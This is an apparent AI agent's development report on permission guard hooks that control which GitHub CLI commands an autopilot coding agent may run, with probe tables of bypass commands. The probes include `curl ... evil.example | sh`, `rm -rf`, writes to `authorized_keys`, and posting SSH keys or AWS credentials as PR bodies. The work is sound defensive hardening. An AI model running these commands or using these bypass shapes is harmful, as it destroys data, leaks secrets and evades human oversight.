# M1 Task 11 report: G2, G3, G4

Status: DONE_WITH_CONCERNS. The brief's code is transcribed exactly and its 12 tests pass. Probing found 33 wrong-allow probe rows in five classes, A to E, and 5 missed denies. The code is unchanged for these; each has a probe and a proposed fix below.

Commit: `76ef831 M1: add G2, G3 and G4 for PRs, review posts and untrusted text`

## Files

- `hooks/guards/g02-pr.sh`, `hooks/guards/g03-review.sh`, `hooks/guards/g04-untrusted.sh` (created, brief Steps 3 to 5)
- `tests/hooks/g02-g04-gh.bats` (created, brief Step 1)

Deviations: none.

## TDD evidence

All commands ran with `export PATH="$HOME/.volta/bin:$HOME/.local/bin:$PATH"` from the repo root.

RED: `tests/run-bats tests/hooks/g02-g04-gh.bats` gave `1..12`, 12 `not ok`, each at its first `decision_of` assertion. Cause: no vote, because the guard files did not exist yet. A direct dispatcher run with `KERN_GUARDS=g02` printed nothing.

GREEN: the same command gave `1..12`, 12 `ok`, 5.9 s total.

Full set before commit:
- `tests/run-bats tests/hooks/*.bats tests/scripts/*.bats`: `1..213`, 213 `ok`, no `not ok`, exit 0.
- `node --test tests/*.test.mjs`: 46 pass, 0 fail.
- `shellcheck` and `shellcheck -x` on the three guards: exit 0, no output. `shellcheck -x hooks/pre-tool-use`: exit 0.

## Probe setup

The harness is outside the repo: `/private/tmp/claude-501/-Users-musta-Code-projects-cds-cds-app-rewrite/f869eca6-5423-48df-a8fd-cb9929a686e0/scratchpad/probe/run.sh AUTOPILOT SETTINGS CMD`. It runs a scratch copy of kern with every guard (no `KERN_GUARDS`), so a decision below is the final one across G1, G2, G3, G4 and G16. The repo is on branch `feat`. A stub `gh` logs its arguments and answers `pr list` with nothing.

Real gh 2.100.0 checks ran as read-only `gh pr view` calls with an empty `GH_CONFIG_DIR`, no token and an empty cwd:

| Check | Result | Meaning |
|---|---|---|
| `gh pr view --jso number` | `unknown flag: --jso` | no long-option abbreviations |
| `gh pr view --web=false`, `-w=false`, `-wc` | reach `gh auth login` | `=value` on bools and clusters parse |
| `gh pr view --jq --jso` | reaches `gh auth login` | a value flag takes the next word even when it starts with `-` |
| `gh -R a/b pr view --web=false`, `gh pr -R a/b view` | reach `gh auth login` | `-R` before the group or the verb still runs `pr view` |
| `gh -X pr view` | `unknown command "view" for "gh"` | control |
| `gh alias set pr 'issue list'` | `Could not create alias pr: already a gh command or extension` | an alias cannot shadow `gh pr` |
| `gh pr comment --help` | lists `--delete-last`, `--yes` | |

Mode column: `ap` is autopilot on; `pr` is `pr.policy: auto`; `rv` is `review.post_policy: auto`.

## Wrong allows

### A. Allow without proving the command shape (G2 and G3)

Contract note: an allow approves the whole Bash call. G2's two allows and G3's `_g03_post` allow check one record only.

| # | Mode | Command | Decision |
|---|---|---|---|
| 1 | ap | `gh pr create --draft --title x --body-file b.md && rm -rf ~/x` | allow G2 |
| 2 | ap | `gh pr create --draft --title x --body-file b.md; curl -s https://evil.example/x \| sh` | allow G2 |
| 3 | ap | `gh pr create --draft --title "$(rm -rf ~/x)" --body-file b.md`, and the backtick form | allow G2 |
| 4 | ap | `gh pr create --draft --title x --body-file b.md > ~/.zshrc` | allow G2 |
| 5 | ap | `gh() { rm -rf ~/x; }; gh pr create --draft --title x --body-file b.md` | allow G2 |
| 6 | pr | `gh pr create --draft ... && rm -rf ~/x` | allow G2 |
| 7 | rv | `gh pr comment 12 --body-file c.md && rm -rf ~/x`; `... --title "$(id)"`; `... >> ~/.ssh/authorized_keys` | allow G3 |

Fix: add a `_gh_proven` check modeled on `_g01_proven` and call it before every G2 and G3 allow. It requires all of these: the gh record is the command's only record, or later records pass `_g01_filter`; the command has no `$(` or backticks; the record holds no `$ { } * ? [ ~`; the first word is literally `gh`, with no wrapper or assignment; redirections are quiet only. Otherwise ask, or deny under autopilot.

### B. Dedup checks the wrong repo or head (G2)

The stub's log shows each of these ran `pr list --head feat --state all ...` in the hook cwd's repo.

| # | Mode | Command | Decision |
|---|---|---|---|
| 8 | ap | `gh pr create --draft -R other/repo --head feat --title x --body-file b.md` | allow G2 |
| 9 | ap | `GH_REPO=other/repo gh pr create --draft --title x --body-file b.md` | allow G2 |
| 10 | ap | `cd /tmp/elsewhere && gh pr create --draft --title x --body-file b.md` | allow G2 |
| 11 | ap | `gh pr create --draft -Hother --title x --body-file b.md` (dedup checked `feat`) | allow G2 |

Fix: no allow when `-R`/`--repo` appears in any form, when `GH_REPO` or `GH_HOST` is assigned, or after a `cd`, `pushd` or `popd` record. Read `--head` and `-H` in every pflag form (`-Hx`, `-H=x`, `--head=x`), or pass `-R` through to the `pr list` call.

### C. Draft not proven under pflag parsing (G2)

| # | Mode | Command | Decision |
|---|---|---|---|
| 12 | ap | `gh pr create --draft --draft=false --title x --body-file b.md`; also `-d -d=false` | allow G2; pflag's last value wins, so the PR is not a draft |
| 13 | ap | `gh pr create --title --draft --body-file b.md`; also `--title -d` | allow G2; `--draft` is the title |

Fix: parse gh options with a table in the style of `_g01_opts`, using pflag rules. Long options are exact names only, and a value may be attached with `=`. A short option takes `-xV`, `-x=V` or the next word, and short options may be clustered. A value flag takes the next word even when it starts with `-`. A bool also accepts `=true` and `=false`, and the last occurrence of a flag wins. Allow only when the resolved draft value is true.

### D. Body text not checked (G2, G3, G4)

| # | Mode | Command | Decision |
|---|---|---|---|
| 14 | ap | `gh pr create --draft --title x --body-file ~/.aws/credentials` | allow G2 |
| 15 | rv | `gh pr comment 12 --body-file ~/.ssh/id_rsa` | allow G3 |
| 16 | ap | `gh pr create --draft --title x --body-file b.md -bhello`; also `-b=hello` | allow G2; G4 misses the attached and `=` forms |
| 17 | rv | `gh pr comment 12 -bhello`; also `-b=hello` | allow G3 |
| 18 | rv | `gh pr review 12 --comment -Fplain.md` | allow G3; `word_value` misses `-Fx`, so the label check never runs |
| 19 | rv | `gh pr review 12 --comment --body-file l.md --body-file plain.md`; also `--body-file=l.md -F plain.md` | allow G3; `word_value` reads the first, gh posts the last |
| 20 | rv | `gh pr review 12 --approve --body-file plain.md` | allow G3; the approve path skips the label check |
| 21 | rv | `gh pr review 12 --comment --body-file np.md` where line 1 is `Nitpicking aside, this is wrong` | allow G3; `_g03_labelled` takes the prefix `nit` as the label |
| 22 | rv | `gh api repos/o/r/issues/1/comments --input -`; `--input missing.json`; `--input esc.json` whose key is `"body"` | allow G3; no body is found, so `ok` stays 1 |
| 23 | rv | `gh api repos/o/r/issues/1/comments -F 'comments[][body]=Looks fine'` | allow G3; G4 matches only words that start with `body=` |

Fixes:
- Allow a `--body-file` only when it resolves, with symlinks followed, inside the worktree or `.kern/`. Otherwise ask.
- G4 and G3 read `-b`, `-F` and `--body-file` through the option table from C, so the attached, `=` and repeated forms all resolve.
- The label must end at `:`, `**`, a blank or the end of the line.
- `_g03_api` refuses an allow when `--input` is `-`, the file is unreadable, no `"body"` key is found, or the file holds `\u`.
- G4 denies a `body` key anywhere in a field name, such as `[body]=`.

### E. Actions beyond posting a review or comment (G3, G2)

| # | Mode | Command | Decision |
|---|---|---|---|
| 24 | rv | `gh pr review 12 --approve=true`; also `-a=true` and `-abLGTM` (stub says author is me) | allow G3; the self-approval check needs the exact word `--approve` or `-a`. `-abLGTM` also gets past G4 |
| 25 | rv | `gh pr review https://github.com/o/r/pull/12 --approve`; `gh pr review other-branch --approve`; `gh pr review 12 --approve -R o/other` | allow G3; the stub log shows `pr view --json author` with no selector, and `pr view 12` without `-R`, so the check reads another PR |
| 26 | rv | `gh pr review 12 --approve` with `gh api user` failing | allow G3; the author lookup failing falls through to the policy |
| 27 | rv | `gh api repos/o/r/pulls/12/reviews -f event=APPROVE`; `--input appr.json` holding `"event":"APPROVE"` and a labelled body | allow G3; self-approval through the API |
| 28 | rv | `gh api -X DELETE repos/o/r/issues/comments/5 -f x=y`; `-X DELETE ... --input appr.json` | allow G3; data deletion is a floor action |
| 29 | rv | `gh pr comment 12 --delete-last --yes` | allow G3 |
| 30 | rv | `gh api graphql -f query='mutation { mergePullRequest(input:{pullRequestId:"X"}) { clientMutationId } } # /comments'` | allow G3. Merge is a floor action. G3 matches `/comments` anywhere in the record, and G1's merge check matches only `/merge` |
| 31 | rv | `gh api graphql -f query='mutation { markPullRequestReadyForReview(...) }' -f n=/comments` | allow G3; this marks the PR ready without `gh pr ready` |
| 32 | rv | `gh api orgs/o/teams/t/discussions/1/comments --input appr.json`, and any `repos/<other>/...` endpoint | allow G3; this posts to a team discussion or another repo |
| 33 | ap | `gh pr create --draft --title x --body-file b.md --assignee someone --reviewer team-x --label bug` | allow G2. GitHub notifies an assignee, and messaging people is a floor action. Labels are a `tracker.policy` write. I did not check whether a review request on a draft notifies anyone |

Fixes:
- Treat a resolved approve value of true as approve.
- Pass the same selector, URL or branch, and `-R` to `gh pr view`. Ask when the selector cannot be parsed or the lookup fails. That matches G2's rule when gh cannot answer.
- Read the endpoint from the first non-option argument of `gh api`, not the record text.
- Allow only these endpoints: POST to `repos/<this repo>/pulls/<n>/reviews`, `repos/<this repo>/pulls/<n>/comments` and `repos/<this repo>/issues/<n>/comments`. The method may be explicit or implied by fields.
- Never allow `graphql`, an `event` of `APPROVE`, `--delete-last`, `--assignee`, `--reviewer`, `--label`, `--project` or `--milestone`. Ask for those instead.
- G1 should also catch `mergePullRequest` in a GraphQL query. That is a separate G1 finding.

## Missed denies

None of these gets a vote, so each takes the normal permission flow. Chained after any allowed record from A, each one becomes an allow.

| Command | Decision | Cause |
|---|---|---|
| `gh -R o/r pr create --title x --body hello` (ap) | none | `gh_sub` returns `-R o/r`, so both the G2 non-draft deny and the G4 deny miss. The same happens for `gh pr -R o/r create ...`, `gh pr --repo=o/r ready 12` (ap) and `gh -R o/r pr review 12 --approve` (rv) |
| `gh issue comment 1 -bhello` (ap) | none | G4 misses the attached form |
| `gh release create v1 --notes 'inline text'` (ap) | none | release text uses `--notes`/`-n`; G4 checks `--body` |
| `gh api -XPOST repos/o/r/pulls/12/reviews` (ap) | none | `word_value -X` misses `-XPOST`; the spec denies every review post under autopilot |
| `gh api repos/o/r/issues/1/comments --field=body=hello`; `-f=body=hello` (rv) | none | G3's `word_has` and G4's `body=*` both miss these forms |

Fix: `gh_sub` skips `-R x`, `-Rx`, `--repo x` and `--repo=x` before the group and before the verb. G4 adds `--notes`/`-n` for `release`. Both read options through the shared table.

Aliases: gh refuses an alias named after a built-in command, so `gh pr create` always runs the real command. An alias with another name, such as `gh co` for `pr create`, gets no vote from G2. That is a missed deny, not an allow.

## Fix round 1

Commit: `2fd01cc M1: G2 and G3 allow only a proven gh shape`, on top of 76ef831. It changes 5 files: the three guards, `hooks/lib/gitctx.sh` (`gh_sub` only) and `tests/hooks/g02-g04-gh.bats`. `g01-git.sh` is unchanged.

### Changes

- `gh_sub` skips `-R <v>`, `-R<v>`, `--repo <v>` and `--repo=<v>` before the group and the verb.
- New shared helpers in `g02-pr.sh`, used by G3 and G4. The dispatcher sources every guard before it calls any.
  - `_gh_load` puts the records in an array.
  - `_gh_args` gives the words after `gh <group> <verb>`.
  - `_gh_opts` is a pflag reader over a closed table. It takes exact long names, `--x=v`, `-xV`, `-x=V` and clusters. A value flag takes the next word even when it starts with `-`, and a bool takes `=true` or `=false`. It emits `?` for a word gh rejects and `>` for a redirection.
  - `_gh_last` returns the last setting of a flag. `_gh_only` checks the options against an allowed set.
  - `_gh_literal`: no `$` or backtick outside single quotes, and no unquoted `~`, glob or brace list. `{owner}` passes.
  - `_gh_proven`: the first record, starting with `gh `, with only `_g01_filter` records after it, no `$(` or backtick, literal words, no `?` token, and redirects only to /dev/null or an fd copy. It calls G1's `_g01_filter` and `_g01_quiet_redirect`, and fails closed when those are not loaded.
  - `_gh_file_ok`: a regular file that is not a symlink. Its physical dir is under the main worktree and not under `.git/`. It is in `work_dir` (.kern), or git does not ignore it.
- G2 `pr create` reads `--draft` as its last setting, so `--draft --draft=false` and `--title --draft` are denied.
  - The duplicate check runs only when the repo and head are certain (`_g02_here`): first record, starts with `gh `, literal, no `-R`, head equal to the current branch.
  - An allow also needs `_g02_proven`: `_gh_proven`, options from `_GH_CREATE_SAFE` only, no argument, and a body file that passes `_gh_file_ok`. Anything else asks, or is denied under autopilot.
  - `pr ready` reads `--undo` as its last setting.
- G3 `pr review` checks self-approval for `--approve` in any form (`=true`, `-a=true`, `-abX`).
  - The author lookup uses the same selector and `-R`. A URL selector or a failed lookup asks, and is denied under autopilot.
  - Every body file is label-checked, approvals included, and a label must be a whole word.
  - `pr comment --delete-last` asks, and is denied under autopilot.
  - The policy-auto allow needs `_gh_proven`, options from the safe table only, at most one selector that is not a URL, and a body file that passes `_gh_file_ok`.
- G3 `gh api`: the method is resolved as gh does it. The default is GET, or POST when fields or `--input` are present.
  - graphql with a mutation, an `@file` field or `--input` asks, and is denied under autopilot. A plain graphql query gets no vote.
  - Any other non-GET call asks, and is denied under autopilot, except a POST to `repos/<o>/<r>/pulls/<n>/(reviews|comments)`.
  - That exception checks `event=APPROVE` in a field or in the `--input` file, and checks every `--input` body for a label.
  - It allows under auto only in the proven shape: no `@file` field, no body field, and an `--input` that passes `_gh_file_ok` and has no `\u`.
- G4 reads pr create, review and comment through their tables, so clusters such as `-abLGTM` are caught.
  - Every pr and issue verb is also scanned for `--body` and `--body=`.
  - The scan checks `-b*` only on the verbs whose `-b` is the body: pr create/edit/merge/review/comment and issue create/comment/edit. gh 2.100.0 `--help` shows `pr checkout -b` is a branch and `issue develop -b` is a base.
  - release create and edit are scanned for `--notes`, `--notes=` and `-n*`.
  - gh api fields named `body` or ending `[body]` are denied, in every flag form.

### Decisions past the ruling

- **pr.policy deny now holds under autopilot.** The brief's G2 checked autopilot before the policy, so autopilot allowed a draft under `pr.policy: deny`. G1 checks a deny policy first, and G2 now does the same.
- **The duplicate check still runs for an unproven draft when the repo and head are certain**, for example a body in /tmp or a `--label`. An open PR is then still denied. Test 16 pins this; it passed on the old code too.
- **Body files under `.git/`, or ignored by git outside `.kern`, are unproven.** That covers `.git/config`, which may hold a token in a remote URL, and `.env`. This is stricter than "inside the main worktree", so it can only add asks.
- **The tables include every gh 2.100.0 flag, so the parse stays aligned with gh:** `--attach`, `--recover`, `-e/--editor` and `-h/--help` on top of the listed ones. A flag outside the safe set is unproven, and `--help` gets no vote.
- `pr comment --edit-last` and `--create-if-none` are outside the safe set, so they ask under auto.

### Brief test changed

`setup` now writes `$R/b.md`. Ruling 4 makes a missing `--body-file` unproven, and brief test 2 expects allow for `--body-file b.md`. No assertion changed.

### Tests

- RED: `tests/run-bats tests/hooks/g02-g04-gh.bats` on the old guards. Tests 1 to 12 ok; 13 of the 14 new tests were `not ok`, each at a probe that still got its old wrong decision (for example `want deny for: gh pr create --draft --title x --body-file b.md && rm -rf ~/x`). Test 16 passed.
- GREEN: same command: `1..26`, 26 `ok`, 36.6 s.
- Full set: `tests/run-bats tests/hooks/*.bats tests/scripts/*.bats` gave `1..227`, 227 `ok`, exit 0. That includes `ok 13 merge asks; gh pr merge asks`, `ok 30 gh pr merge with -R or --repo asks` and `ok 120 gh_sub, word_value and word_has`. `node --test tests/*.test.mjs` gave pass 46, fail 0.
- `shellcheck` and `shellcheck -x` on the three guards and `gitctx.sh`: exit 0. `shellcheck -x hooks/pre-tool-use`: exit 0.
- Every probe from classes A to E and the missed-deny table is a regression test in tests 13 to 26. Each runs every guard and asserts the final decision.

Re-probing the new allow paths in the scratch copy found no new allow. Each of these asks, or is denied under autopilot: `| tee ~/.zshrc`, `| grep -f /etc/passwd x`, `2>out.txt`, `>&-`, a body file through a symlinked dir (`homelink/.ssh/id_rsa`), `<(cat ~/.ssh/id_rsa)`, a backslash-newline continuation, `--head feat:feat`, `--hostname`, `-H 'X-HTTP-Method-Override: DELETE'`, an endpoint with `?event=APPROVE`, and an endpoint with `..` segments.

### Residual concerns

- The api exception does not compare `<o>/<r>` with this repo, as ruled. Under `review.post_policy: auto`, a labelled review can be posted to another repo's PR. Proposed fix: allow only `{owner}/{repo}`, or the owner/repo of the remote gh resolves.
- A quoted `>` in a flag value (`--title '>'`) is read as a redirection. The parse then goes wrong, but always toward ask: the `>` token is not quiet, so `_gh_proven` fails. The ask reason can name the wrong problem.
- A trailing comment that holds `~`, `$` or a glob makes the shape unproven. `_split_words` keeps comment text in the record. This only adds asks.
- G4 has no tables for pr edit and merge or for issue create, comment and edit, so a cluster such as `gh pr merge -dbX` gets past G4. G1 still asks on every merge and denies it under autopilot. None of these verbs has a kern allow.
- `docs/plans/contract.md` does not list the `_gh_*` helpers, or that `gh_sub` reads `-R`.

## Fix round 2

Commit: `0846931 M1: G3 reads multi-line review input and stays on this repo`, on top of 2fd01cc. It changes `g03-review.sh`, `g04-untrusted.sh`, `gitctx.sh` (`gh_sub` only) and the bats file. `docs/plans/contract.md` has uncommitted changes, which are the lead's contract edit. I did not stage it.

### Changes

1. **Multi-line `--input`.** `_g03_api` reads the file as one line (`tr '\n\r' '  '`) before the body-label and `event=APPROVE` checks. The post is unproven unless the count of `"event"` and of `"body"` keys equals the count of full `"key" : "string"` matches (`_g03_count`).
2. **Other repos.** The api review exception still runs the label and self-approval checks for any owner/repo. An allow also needs the endpoint repo to be the literal `{owner}/{repo}`; any other repo asks under auto.
3. **Path and case.** `gh_sub` takes the basename of the first word and lowercases it, as G1 does. `_gh_proven` still requires the record to start with `gh `, so a path form never gets an allow.
4. **Clusters.** `_g04_text` knows each text-taking verb's text letter and boolean short flags, from gh 2.100.0 `--help`.

   | Text flag | Verbs (boolean shorts) |
   |---|---|
   | `-b` `--body` | pr create (`defw`), pr merge (`dmrs`), pr review (`acr`), pr comment, issue create and issue comment (`ew`), pr edit and issue edit (none) |
   | `-n` `--notes` | release create (`dp`), release edit (none) |
   | `-c` `--comment` | pr close (`d`), pr reopen, issue close and issue reopen (none) |

   A word is inline text when it is the long flag, `--x` or `--x=`. It is also inline text when it is a short cluster that reaches the letter through boolean letters only (`_g04_cluster`). `--body` on any pr or issue verb still counts. The pr create, review and comment table parse in G4 is gone, because the cluster rule covers it.
5. **close and reopen.** As in the table: `--comment`, `--comment=`, `-c` and clusters such as `-dcX` are denied, with their own reason.
6. **Timeouts.** Both `_g03_self` gh calls use `with_timeout 8`.
7. **Pins.** `gh pr review 12 -aFl.md` with the author set to me is denied. A failed `pr view` lookup asks, and is denied under autopilot.

### Tests

- RED: `tests/run-bats tests/hooks/g02-g04-gh.bats` after adding tests 27 to 31 and the round-1 test-26 change (`repos/o/r` now expects ask).
  - Tests 26 to 29 were `not ok`, each at a reviewer probe, for example `want deny for: gh api repos/o/r/pulls/12/reviews --input ml-appr.json`.
  - Tests 30 and 31 passed. They pin behaviour that already worked, as item 7 asked.
- GREEN: same command: `1..31`, 31 `ok`, 41.5 s.
- Full set: `tests/run-bats tests/hooks/*.bats tests/scripts/*.bats` gave `1..232`, 232 `ok`, exit 0, including G1's `gh pr merge` tests and `gh_sub, word_value and word_has`. `node --test tests/*.test.mjs` gave pass 46, fail 0.
- `shellcheck` and `shellcheck -x` on the three guards and `gitctx.sh`: exit 0. `shellcheck -x hooks/pre-tool-use`: exit 0.

The reviewer's harness (`t11rev/p.sh`, author set to me where it matters) gave these decisions:
- deny: `ml-appr.json` on `repos/o/r` and on `{owner}/{repo}`, as a self-approval.
- deny: `ml-body.json`, for the label.
- ask: `repos/other/elsewhere/.../reviews --input ok.json`.
- allow: `repos/{owner}/{repo}/.../reviews --input ok.json`.
- deny, all as required: `/path/to/gh pr ready 12` under autopilot, `GH pr review 12 --approve`, `/usr/bin/gh pr comment 12 --body hi`, `gh issue create -wbhi`, `gh release create v1 -dnhi`, `gh pr merge -dbX`, `gh pr close 12 --comment hi` and `gh pr review 12 -aFl.md`.

### Residual concerns

- The 8 s limit is per gh call, not per Bash call. A command with several gh records can exceed the 20 s hook timeout. Examples are two approvals, or a `pr create` dedup (10 s) plus an approval. The dispatcher's `"onFailure": "block"` then blocks the call, so the failure is closed.
- A body string that contains `"event"` or `"body"` as a whole value, such as `"body":"event"`, makes the key counts differ. That gives ask, never allow.
